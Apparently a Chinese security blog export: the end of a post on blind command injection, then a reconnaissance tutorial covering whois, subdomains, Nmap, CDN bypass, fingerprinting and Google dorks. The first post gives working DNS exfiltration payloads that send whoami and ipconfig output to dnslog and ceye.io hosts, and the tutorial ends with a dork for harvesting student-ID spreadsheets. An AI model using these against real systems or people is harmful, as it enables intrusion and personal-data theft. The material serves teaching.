src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161596-6adcbdeb-489e-4552-be7c-a2a20628eaa6.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&originHeight=307&originWidth=940&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161819-5b984f68-02b5-49b7-94b5-73127adb26da.png#align=left&display=inline&height=190&margin=%5Bobject%2Object%5D&originHeight=479&originWidth=1046&status=done&style=none&width=415\"></p>\n<h3 id=\"5-2Dnslog外带数据\"><a href=\"#5-2Dnslog外带数据\" class=\"headerlink\" title=\"5.2Dnslog外带数据\"></a>5.2Dnslog外带数据</h3><h4 id=\"5-2-1-获取windows用户名\"><a href=\"#5-2-1-获取windows用户名\" class=\"headerlink\" title=\"5.2.1 获取windows用户名\"></a>5.2.1 获取windows用户名</h4><figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162343-fd422547-5db2-45b0-8264-c6a8b4324b2d.png#align=left&display=inline&height=163&margin=%5Bobject%2Object%5D&originHeight=430&originWidth=1093&status=done&style=none&width=415\"><br>windows常用变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//变量                     类型       描述</span><br><span class=\"line\">//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。</span><br><span class=\"line\">//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class=\"line\">//%CD%                     本地       返回当前目录字符串。</span><br><span class=\"line\">//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class=\"line\">//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class=\"line\">//%COMPUTERNAME%           系统       返回计算机的名称。</span><br><span class=\"line\">//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class=\"line\">//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class=\"line\">//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class=\"line\">//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class=\"line\">//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。</span><br><span class=\"line\">//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</span><br><span class=\"line\">//%PATH%                   系统       指定可执行文件的搜索路径。</span><br><span class=\"line\">//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class=\"line\">//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class=\"line\">//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。</span><br><span class=\"line\">//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。</span><br><span class=\"line\">//%PROCESSOR_REVISION%     系统       返回处理器的版本号。</span><br><span class=\"line\">//%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class=\"line\">//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class=\"line\">//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class=\"line\">//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。</span><br><span class=\"line\">//%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class=\"line\">//%TIME%                   系统       返回当前时间。使用与                                                                                   time       /t                                                                     命令相同的格式。由         Cmd.exe                  生成。有关                       time   命令的详细信息，请参阅 Time。</span><br><span class=\"line\">//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。</span><br><span class=\"line\">//%USERNAME%               本地       返回当前登录的用户的名称。</span><br><span class=\"line\">//%USERPROFILE%            本地       返回当前用户的配置文件的位置。</span><br><span class=\"line\">//%WINDIR%                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure>\n<h4 id=\"5-2-2-其他命令执行\"><a href=\"#5-2-2-其他命令执行\" class=\"headerlink\" title=\"5.2.2 其他命令执行\"></a>5.2.2 其他命令执行</h4><figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,-1%.xxxx.ceye.io)&amp;del temp</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd /c ipconfig &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,40%.xxxx.ceye.io &amp; cmd /c nslookup %_:~40,-1%.xxxx.ceye.io)&amp;del temp</span><br></pre></td></tr></table></figure>\n\n<p>通过POST传参测试<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162550-1ce46dae-aed3-4995-9021-f8a247144874.png#align=left&display=inline&height=95&margin=%5Bobject%2Object%5D&originHeight=159&originWidth=414&status=done&style=none&width=248\"><br>传参的内容需要进行url编码<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162770-391b3b8d-9947-440a-9529-5004a5bbd534.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&originHeight=431&originWidth=1521&status=done&style=none&width=415\"><br>Post传参<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163079-b19d4b32-222e-4b37-ab74-a88964a3839b.png#align=left&display=inline&height=138&margin=%5Bobject%2Object%5D&originHeight=407&originWidth=1226&status=done&style=none&width=416\"><br>Dnslog获取结果<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163323-d049cc56-b450-4492-8ee3-434865c75b6c.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&originHeight=465&originWidth=1135&status=done&style=none&width=415\"><br>Base64解码获取内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163685-f6a56798-fc6e-4dd3-8f6b-520b6a7efd23.png#align=left&display=inline&height=229&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=648&status=done&style=none&width=389\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>       在渗透测试过程中，无回显是很常见的，程序不可能将一些操作都回显到页面中，那么这种时候我们就需要外带数据来获取想要的内容。当然最好就是能够反弹shell，通过获取shell来执行命令，这样会舒服很多。<br>       无回显的情况还有很多很多，这里简单介绍了几种，希望读者朋友们能够从中学到对于无回显的情况下如何进行渗透测试，方法很多，不固定，学习思路即可。</p>\n"},{"title":"如何进行信息收集","keywords":"web安全,信息收集","description":"针对一个站点如何进行信息收集？","cover":"https://img2.baidu.com/it/u=207705934,1439123695&fm=26&fmt=auto&gp=0.jpg","date":"2020-10-02T02:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 网络安全法\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318010564-9fc29c4c-dae7-4181-b53f-e9b50e2c7079.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&originHeight=176&originWidth=895&status=done&style=none&width=415)\n上面是中国网络安全法第四十一条，因为与这篇推文相对应，所有拿出来用。信息收集的作用很强大，希望大家在学习的同时，注意把握度量！\n**本篇推文仅涉及信息收集教学，如有任何不良情况，请第一时间联系我删除。**\n# 前言\n归结而言，信息搜集，是渗透测试的灵魂。其实在日常生活中我们无时无刻不在进行信息收集。要参加一个比赛，我们会提前了解比赛内容，这就是信息收集；要追求一个女生，我们会通过接触她的闺蜜，了解她的喜好，获取她的微信号、QQ号等，这也是信息收集。在抗战时期，信息收集的重要性就体现出来了，一场战争的输赢，在很大程度上就依赖于信息收集的完整性。敌军的数量有多少、军队部署怎么样等，可以让我们提前针对并部署相应的方案来应对。这也是为什么当时情报部门非常重要的体现了。\n那么接下来，我将详细介绍在渗透测试中如何进行信息收集。\n# 1.whois信息\n\n![](https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318010785-fb525994-7672-49f7-bbb7-ccb4d4c5773e.jpeg#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=599&originWidth=1004&status=done&style=none&width=416)\n什么是whois？whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库。在渗透测试中，whois可以很好地收集到目标域名的相应信息，例如注册人的邮箱，姓名，手机号等。进行whois信息收集一般是通过在线工具：\n\n###### 站长之家\n[http://whois.chinaz.com/](http://whois.chinaz.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011036-2643d590-cab6-4fb7-97b0-390357bfd661.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&originHeight=622&originWidth=1514&status=done&style=none&width=415)\n###### 中国万网\n    [https://whois.aliyun.com/](https://whois.aliyun.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011319-c2188cc2-200d-41cd-b815-b92cfdf44f95.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&originHeight=757&originWidth=1639&status=done&style=none&width=415)\n###### Whois.com\n    [https://www.whois.com/](https://www.whois.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011570-840227d8-d2c1-4801-bb2a-5d20217c7755.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=818&originWidth=1649&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011880-2eb94c58-36a0-4ef8-81d5-a38cda973365.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=876&originWidth=1560&status=done&style=none&width=415)\n个人还是比较喜欢whois.com的，因为站长之家等网站会对一些信息进行隐藏，所以我比较多用其他的。Whois查询网站还有很多很多，可以通过百度whois来获取。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012193-94c82cb1-a2a2-4525-bdfd-87651d245f70.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1649&status=done&style=none&width=416)\n\n这里还是以站长之家whois 查询sougou.com来举例：\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012469-52918a1e-d2c4-4e00-86a9-375f4b9db14d.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=688&originWidth=1101&status=done&style=none&width=415)\n可以看到，这里我查询的域名是sougou.com，通过whois，我可以知道注册商，注册人的邮箱，联系电话等信息。在这些信息后面有个whois反查，这个也很重要，whois反查可以查询该联系人或者该邮箱还注册了什么网站。如图为whois反查联系电话的结果，可以看到下面都是该联系电话注册的网站。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012718-b5043e7e-b219-42ed-b588-a1147c8c1569.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&originHeight=796&originWidth=1545&status=done&style=none&width=416)\n\n\n# 2.子域名查询\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012941-9bb94596-8575-4708-8afd-354f032e0c3f.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&originHeight=124&originWidth=252&status=done&style=none&width=189)\n首先介绍一下什么是域名。\n这里我以微信公众平台的域名举例。如图可以看到，这里的URL的前面的部分是mp.weixin.qq.com。这就是域名。在这里我们可以进行拆分为以下几个域名：\n1.    mp.weixin.qq.com\n2.    weixin.qq.com\n3.    qq.com\n\n最短的那个qq.com便是根域名，也叫一级域名，这种域名所在的网站相对安全，很难对其进行渗透测试。但是根域名可以衍生出很多很多子域名，他们有直接或者间接的联系。也就是说，如果你对一个子域名进行了渗透测试，很可能会间接对根域名所在服务器进行影响，所以我们可以对子域名进行信息查询，进而可以扩大攻击范围，子域名一定是有关联的，很多时候基本上都同属一个公司。\n查询子域名有以下几种方法：\n1、通过google语法的site\n2、通过layer子域名挖掘机\n3、通过在线网站\n4、通过burp的爬虫模块\n###### 1.google语法的site语法：\n搜索引擎非常强大，site语法的做用是查询site后面的域名下的所有站点，包括子域名；如图所示，我查询了baidu.com，下面出现的全部都是baidu.com域名下的网站，如[site.baidu.com](http://www.baidu.com/link?url=QbP0CFzbjqE-QGJYkDXlWiAZpdBm9d976Ij32TA6LUe&ck=5250.6.1604460120086.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg)、baike.baidu.com、[duer.baidu.com/](https://www.baidu.com/link?url=3FgwnT9QFN6vq3kWs5j6pwOABJaCIh7TsI3BTK9ztZi&ck=1572.23.10095.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg&wd=&eqid=c03388eb000019b6000000065fa21e1e)等。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013238-cd05bb41-5943-41a7-9763-2d548e52b163.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=885&originWidth=1573&status=done&style=none&width=415)\n###### 2.layer子域名挖掘机\n轻量级的子域名挖掘神器，它的原理是通过对于子域名进行爆破，获取相应的子域名再呈现出来，具体用法很简单，填写主域名、设置端口、选择dns解析的服务器，最后点击启动即可，如图所示，我爆破获取百度的子域名。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013785-a9990f28-ea8a-4597-ac48-1dfa7eb6deab.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&originHeight=815&originWidth=1498&status=done&style=none&width=415)\n###### 3.在线网站\n站长工具\n[http://tool.chinaz.com/subdomain/](http://tool.chinaz.com/subdomain/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014014-94735611-5da3-4581-986f-0e6fd6cc428d.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=819&originWidth=1456&status=done&style=none&width=415)\n\n微步社区\n[https://x.threatbook.cn/](https://x.threatbook.cn/)\n微步社区最大的作用是用来查询威胁情报的，查询子域名我并不是很喜欢，比较少用。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014278-4f959e7d-4af0-43c6-91d3-d5bf92e81adf.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=674&originWidth=1653&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014509-9d1e0079-2f8c-4a3a-9909-b37ee5990d6a.png#align=left&display=inline&height=118&margin=%5Bobject%20Object%5D&originHeight=459&originWidth=1615&status=done&style=none&width=415)\n在线二级域名子域名查询\n[http://tools.bugscaner.com/subdomain/](http://tools.bugscaner.com/subdomain/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014754-47fa1d03-4d3c-488e-9bc5-823769f28d5a.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1541&status=done&style=none&width=416)\n###### 4.Burp的Spider模块\n首先要先捕获到主域名的数据包\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015002-6bb5d9cf-783c-446c-85fd-60e2c8f4bcf3.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n右键send to Spider\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015253-75033e01-6639-4e33-9f04-a47e86e51c3f.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015499-4bd67a81-244c-425a-929f-dd1bc5b6e968.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n在target模块便可以看到很多百度的子域名，而且burp的好处是不仅仅查询子域名，还能够查询到站点地图，这在很大程度上帮助我们了解了网站的具体框架结构，为后续的渗透测试奠定基础。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015717-513eea50-902a-4bdc-b1c0-0c3b1d3cebf8.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n总而言之，收集子域名的方法还有很多，我比较喜欢用的就是layer子域名挖掘机和burp，当然还有很多在线工具可以通过百度子域名获取到。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016022-e11516a3-b4f0-428c-8198-ca2c8cc7a76a.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&originHeight=839&originWidth=1381&status=done&style=none&width=416)\n# 3.端口扫描\n###### Nmap\n说到端口扫描就马上可以想到kali Linux这个网络安全人员所熟知的系统。在kali系统里面集成了很多渗透测试的工具，其中有一款叫**Nmap**的工具，可以通过相应语法对目标主机进行端口扫描，得到目标主机的端口开放情况信息。有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站。\n![](https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318016319-d7d1ce62-3b0c-4b38-8c8f-68a533fcbdcf.jpeg#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&originHeight=831&originWidth=1080&status=done&style=none&width=416)\n基础命令\n-p  指定端口扫描\n-v    显示扫描过程\n-Pn 跳过主机发现过程直接端口扫描 [目标禁ping时使用]\n-O   探测主机操作系统\n-A   全面扫描，包括一切探测，由于动静太大而且时间问题不怎么使用\n\n端口扫描状态\nOpend 端口开放\nClosed 端口关闭\nFiltered 端口被过滤\n###### 在线网站\n站长之家(因为要防止恶意攻击，所以只能单个端口测试)\n[https://tool.chinaz.com/port/](https://tool.chinaz.com/port/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016520-ce55aeb8-c365-44d1-b2cf-b2ea74ae5b3f.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=466&originWidth=1518&status=done&style=none&width=416)\nPostJson在线端口检测\n[http://coolaf.com/tool/port](http://coolaf.com/tool/port)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016801-603296e2-91f9-4e25-a719-994febd4fb4d.png#align=left&display=inline&height=191&margin=%5Bobject%20Object%5D&originHeight=786&originWidth=1704&status=done&style=none&width=415)\n\n\n# 4.目录扫描\n目录是什么，目录就是一个网站的骨架，正如我们平时访问一个网站，先是进入了主目录，或者说访问了index.php/index.html等index文件，但是我们不知道目标网站还有哪些目录文件是我们可以访问的，所以就需要进行目录扫描了。下面介绍如何进行目录扫描。\n###### 御剑目录扫描工具\n御剑是一款能够通过字典对目标域名进行轮询访问，检测http状态码的软件，如果得到200回应就记录下来，也就得到了我们需要的目录信息。\n这里随便扫了一个靶场，可以看到网站目录除了index.php之外还有一个robosts文件。robots.txt是一个基本上在每个网站中都会放置的文件，里面会标明了哪些目录可以爬取，哪些不可以爬取，当然这往往只是君子协议，真的爬取了也是无法拦截的。渗透测试过程中往往可以通过访问robots文件查看一些敏感目录。\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017024-3f6d7017-9bb4-4ed6-b7b5-cfa57d7784b6.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&originHeight=422&originWidth=929&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017250-f2829b8b-9724-4f35-8b6f-34435020bdfa.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&originHeight=191&originWidth=706&status=done&style=none&width=415)\n# 5.C段\nC段，即IP地址的C段地址，如192.168.1.0/24。在渗透测试过程中，一个公司可能由于业务原因，会购买多个公网IP，那么为了方便，这些IP往往是相连的，甚至该公司会直接将那个公网IP的一个C段买下来。也就是说，测试站点所处的IP地址的C段，很可能也是该公司的资产，在渗透测试过程中可以通过迂回战术，先拿下C段的该公司的其他站点，再来对主站点进行渗透测试。\n       要获取C段就涉及了一个内容——CDN，内容分发网络，是为了负载均衡，内容分发等而创建的一个智能虚拟网络。对于一些大公司来说，他的业务可能会有非常多以至于全世界都有人访问，那么一台服务器是不足以完成那么大的工作量的，这时候就需要购买CDN了，对于不同区域的用户分发不同的IP地址，里面存储了需要访问的资源，能够很大程度上减轻服务器的压力。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017568-5c04002e-c8b5-4e82-ba3d-7abd035154a3.png#align=left&display=inline&height=161&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1653&status=done&style=none&width=415)\n       有了CDN的存在也就是说，我们通过ping域名的方式获取的IP地址不一定是真实IP地址，所以我们就需要绕过CDN来获取真实IP地址进而获取C段。 下面介绍如何判断是否有CDN以及如何获取真实IP。\n## 判断是否有CDN\n有一个在线工具叫多地点Ping，可以通过不同地点ping域名的对应IP是否相同来判断有没有CDN服务。\n[https://www.ping.cn/ping/](https://www.ping.cn/ping/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018031-574a3b07-13e2-43a7-ab42-68fc29bfe3b9.png#align=left&display=inline&height=201&margin=%5Bobject%20Object%5D&originHeight=827&originWidth=1710&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018340-373bc336-a54f-4277-b598-d393df18b9f5.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&originHeight=808&originWidth=1756&status=done&style=none&width=444)\n这里我测试的是baidu.com，很明显不同地区的IP不同，所以存在CDN。\n## 绕过CDN获取真实IP\n1、 子域名查询\n子域名与主域名同一服务器\nCDN挂在主域名上，但是不一定挂在子域名上\n\n2、邮件服务器\n从邮件服务器请求邮件，邮件中可以获取真实IP\n\n\n3、国外地址请求（国外ping）\n4、遗留文件，扫描全网\n例如通过phpinfo.php文件中获取IP地址\n全网ping，从CDN中筛选真实IP\n\n\n5、fofa、shodan、zoomeye搜索特定文件/信息\n6、dns历史记录\n查询未使用cdn之前留下的真实IP记录\n\n\n# 6.旁站\n旁站，即同IP不同站点。旁站一般都是和目标站点在同一个内网或者是同一台服务器。在渗透测试过程中为了加大攻击面，往往还会获取目标的旁站，从旁站入手进行渗透测试。下面介绍如何获取旁站，一般都是通过在线工具获取。\n###### 站长工具\n[http://stool.chinaz.com/same](http://stool.chinaz.com/same)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018532-9a0319b4-0f54-48e3-adc2-2d29d669163a.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&originHeight=881&originWidth=1525&status=done&style=none&width=415)\n###### The Web of WebScan\n       [https://www.webscan.cc/](https://www.webscan.cc/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018886-df5563b1-1301-4226-b344-36b4f314564e.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&originHeight=851&originWidth=1630&status=done&style=none&width=416)\n# 7.指纹识别\n       指纹识别，也就是通过指纹信息判断当前系统的环境配置、使用的CMS等。说到指纹我们都不陌生了，手机就有指纹解锁。我们可以通过指纹信息判断一个人的身份，是否为当前手机的机主。渗透测试中的指纹识别也差不多，通过识别目标网站是否使用CMS模板搭建，使用了什么框架等，可以让我们能够针对性的对其进行渗透。\n       CMS，内容管理系统。即一套web系统的模板，我们可以通过CMS快速搭建一个网站，这种模板的代码一般开源，在网上也有很多旧版本的漏洞。通过识别是什么CMS，我们就可以搜索该CMS的历史漏洞，即Nday，测试是否有修复。\n       指纹识别一般通过下面几种在线工具进行识别。\n###### Whatweb在线指纹识别\n[http://whatweb.bugscaner.com/](http://whatweb.bugscaner.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019120-8c399c9b-1803-4b93-b5a9-6d1a8e2797bf.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&originHeight=730&originWidth=1434&status=done&style=none&width=416)\n如图我们成功判断出该站点的cms为dedecms，那么就可以通过dedecms的历史漏洞进行渗透测试。\n###### 微步社区（tips:只输入域名即可，不需要加上http://）\n[https://x.threatbook.cn/](https://x.threatbook.cn/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019391-b0d067bd-76ae-4851-94ce-3f628b4040e7.png#align=left&display=inline&height=187&margin=%5Bobject%20Object%5D&originHeight=797&originWidth=1767&status=done&style=none&width=415)\n微步社区不怎么用，还是以查询威胁情报为主的，这里看到可以查询到域名解析、子域名、whois等信息。\n###### 云溪指纹（需要邀请码，需要注册，还挺麻烦的）\n[https://www.yunsee.cn/](https://www.yunsee.cn/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019653-f806593e-20f9-44c0-8c03-8f8c288528e2.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&originHeight=813&originWidth=1687&status=done&style=none&width=415)\n可以看到云溪指纹查询的信息就很全面，然后还提供了查看漏洞功能，所以个人是很喜欢使用云溪指纹识别的。\n# 8. 内容敏感信息泄露 （google hacking）\n###### Google搜索引擎\nGoogle是一款十分强大的搜索引擎，黑客们常常借助它搜索网站的一些敏感目录和文件，甚至可以利用它的搜索功能来自动攻击那些有漏洞的网站；而有些人可以通过搜索把某个个人的信息，包括住址、电话号码、出生年月等都可以搜索出来；当然我们在日常的生活中正确的借助Google搜索也可以更加高效的找到我们需要的东西。也就是说我们通过谷歌搜索引擎，加上google语法，能够收集到一些敏感信息。\n###### Google镜像站\n我们都知道，国内是无法访问google搜索引擎的，虽然其他搜索引擎也是可以使用google语法的，但是会过滤掉一些信息，用起来很不方便，所以还是推荐使用谷歌。\n有一款工具叫**谷歌镜像站**，是国人搭建的类似google搜索引擎的网站，可以达到类似google的效果。谷歌镜像站可以通过百度获得。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019936-1bd50b23-7b3c-4a70-aa96-658e0335aca6.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=715&originWidth=995&status=done&style=none&width=415)\n\n###### Google语法\n1.site\nsite:edu.cn //搜索该域名下的所有站点，包括子域名\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020203-b6a9c5f9-0501-4077-8730-96ea362b3292.png#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&originHeight=868&originWidth=1016&status=done&style=none&width=416)\n2.inurl\n搜索域名中与关键字匹配的页面\n常用的有\ninurl:php?id= //查询域名中带有php?id=的页面\ninurl:admin.php //查询域名中带有admin.php的页面，多用于查询后台\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020523-4b20c405-75d4-40d8-a820-4ec187a5ab43.png#align=left&display=inline&height=354&margin=%5Bobject%20Object%5D&originHeight=859&originWidth=1008&status=done&style=none&width=415)\n3.intitle\n搜索网页中的标题内容与关键字匹配的页面\nintitle:后台管理 //查询网页标题含有后台管理的页面\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020892-9b3a08b4-41fd-47b9-9754-1b31090ff1a1.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&originHeight=862&originWidth=966&status=done&style=none&width=415)\n4.intext\n搜索网页内容与关键字匹配的页面\nintext:dedecms //查询网页内容含有dedecms的页面\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021172-54b43fd9-0539-45f9-991c-a972cdf7a329.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&originHeight=877&originWidth=1004&status=done&style=none&width=416)\n5.filetype\n搜索文件类型与关键字匹配的文件\nfiletype:xls //查询excel文件\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021378-a16c3394-66ad-4e74-a6e0-c35950d33e3c.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=860&originWidth=1379&status=done&style=none&width=415)\n###### 内容敏感信息泄露\n1、搜索高校存在学号字眼的excel文件，用来获取学号信息\n语法：filetype:xls site:edu.cn 